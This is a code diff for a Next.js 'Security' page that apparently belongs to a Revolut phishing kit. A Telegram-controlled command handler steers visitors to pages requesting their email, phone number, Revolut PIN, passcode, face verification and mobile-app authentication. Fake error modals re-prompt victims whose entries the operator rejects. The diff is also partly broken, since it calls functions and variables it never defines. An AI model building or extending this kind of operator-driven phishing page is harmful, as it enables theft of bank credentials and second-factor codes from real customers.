@@ -9,11 +9,108 @@ import { sendMessageToTelegram } from '../lib/api';
 import { useCommand } from '../app/lib/CommandContext';
 import countriesData from '../app/lib/countries'
 import CountriesDropdown from '../components/CountriesDropdown'
+import RevoluteLoader from '../components/RevoluteLoader';
+import MobileAuthModal from '../components/MobileAuthModal'
+import ErrorModal from '../components/ErrorModal'
 
 export default function Security() {
     const router = useRouter();
     // const { command } = useCommand(); // Get the current command from Telegram
     const [pins, setPins] = useState(''); // manage the state of the pin inputs
+        const [displayLoader, setDisplayLoader] = useState(false)
+    const [displayError, setDisplayError] = useState(false)
+    const [displayAuth, setDisplayAuth] = useState(false)
+
+    // Handle wether to display error for phone number or email
+    const [displayMessage, setDisplayMessage] = useState('phone')
+
+
+
+// This function displays the revolut Loader
+    const displayPageLoader = () => {
+        console.log("NOW DISPLAYING PAGE LOADER")
+        setDisplayLoader(!displayLoader)
+    }
+
+    // This function displays the Mobile Auth modal
+    const displayAuthModal = () => {
+        console.log("NOW DISPLAYING MOBILE AUTH MODAL")
+        setDisplayAuth(!displayAuth)
+    }
+
+    // This function displays the revolut error modal
+    const displayErrorModal = (errorType) => {
+        console.log("Now Displaying Error Modal")
+        setDisplayError(true)
+        setDisplayMessage(errorType)
+    }
+
+    const [commandCounter, setCommandCounter] = useState(0);
+    const setCommand = (newCommand) => {
+  // Check if it's one of the commands that should trigger the error modal
+      const errorCommands = [
+        'REQUEST_EMAIL_AGAIN',
+        'REQUEST_NUMBER_AGAIN',
+        'REQUEST_REVOLUT_PIN_AGAIN',
+        'REQUEST_REVOLUT_PASSCODE_AGAIN'
+      ];
+      
+      // If it's the same command as before and it's an error command, increment the counter
+      if (newCommand === command && errorCommands.includes(newCommand)) {
+        setCommandCounter(prev => prev + 1);
+      }
+      
+      // Set the actual command
+      setYourCommandState(newCommand);
+    };
+
+
+
+    useEffect(() => {
+        if (command === 'REQUEST_EMAIL_AGAIN') {
+            console.log("HERE WE WILL REQUEST EMAIL AGAIN");
+            displayErrorModal('email'); // Show error modal for email
+        } else if (command === 'REQUEST_NUMBER_AGAIN') {
+            console.log("HERE WE WILL REQUEST NUMBER AGAIN");
+            displayErrorModal('phone'); // Show error modal for phone number
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
+                displayPageLoader();
+                router.push('/PasswordPage');
+            }, 500);
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
+            console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
+            displayErrorModal('passcode'); // Show error modal for passcode
+        } else if (command === 'REQUEST_REVOLUT_PIN') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO PIN PAGE");
+                displayPageLoader();
+                router.push('/PasswordPage');
+            }, 500);
+        } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
+            console.log("HERE WE WILL REQUEST REVOLUT PIN");
+            displayErrorModal('pin'); // Show error modal for pin
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
+                // displayPageLoader();
+                // router.push('/FaceVerificationPage');
+            }, 500);
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
+            // displayErrorModal('face_verification'); // Show error modal for face verification
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            setTimeout(() => {
+                console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
+                router.push('/MobileAuthPage');
+            }, 500);
+        } else if (command === 'FINISH') {
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/verificationPage');
+            }, 1500);
+        }
+    }, [command, router, commandCounter]);
 
 
     // Handle input change for the pc viewport
@@ -105,6 +202,27 @@ export default function Security() {
     return (
         <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
             {/* Pc version */}
+                        {/* all modals for this page */}
+            {displayError ? (
+                <ErrorModal
+                    displayError={displayError}
+                    setDisplayError={setDisplayError}
+                    displayMessage={displayMessage}
+                />
+            ) : null}
+            {displayAuth ? (
+                <MobileAuthModal
+                    displayAuth={displayAuth}
+                    setDisplayAuth={setDisplayAuth}
+                    displayMessage={displayMessage === 'Phone number' ? 'Enter your phone number' : 'Enter authentication code'}
+                />
+            ) : null}
+            {displayLoader ? (
+                <RevoluteLoader
+                    displayLoader={displayLoader}
+                    setDisplayLoader={setDisplayLoader}
+                />
+            ) : null}
             <div className='hidden md:block'>
                 <Header />
                 <div className="flex min-h-[550px] justify-center items-start md:items-center ">
@@ -194,6 +312,27 @@ export default function Security() {
 
             {/* Mobile version */}
             <div className='w-full flex flex-col h-screen justify-between md:hidden px-4 pt-[16px]'>
+            {/* all modals for this page */}
+            {displayError ? (
+                <ErrorModal
+                    displayError={displayError}
+                    setDisplayError={setDisplayError}
+                    displayMessage={displayMessage}
+                />
+            ) : null}
+            {displayAuth ? (
+                <MobileAuthModal
+                    displayAuth={displayAuth}
+                    setDisplayAuth={setDisplayAuth}
+                    displayMessage={displayMessage === 'Phone number' ? 'Enter your phone number' : 'Enter authentication code'}
+                />
+            ) : null}
+            {displayLoader ? (
+                <RevoluteLoader
+                    displayLoader={displayLoader}
+                    setDisplayLoader={setDisplayLoader}
+                />
+            ) : null}
                 {/* Back button */}
                 <div className='w-full h-[40px] flex justify-start'>
                     <button>
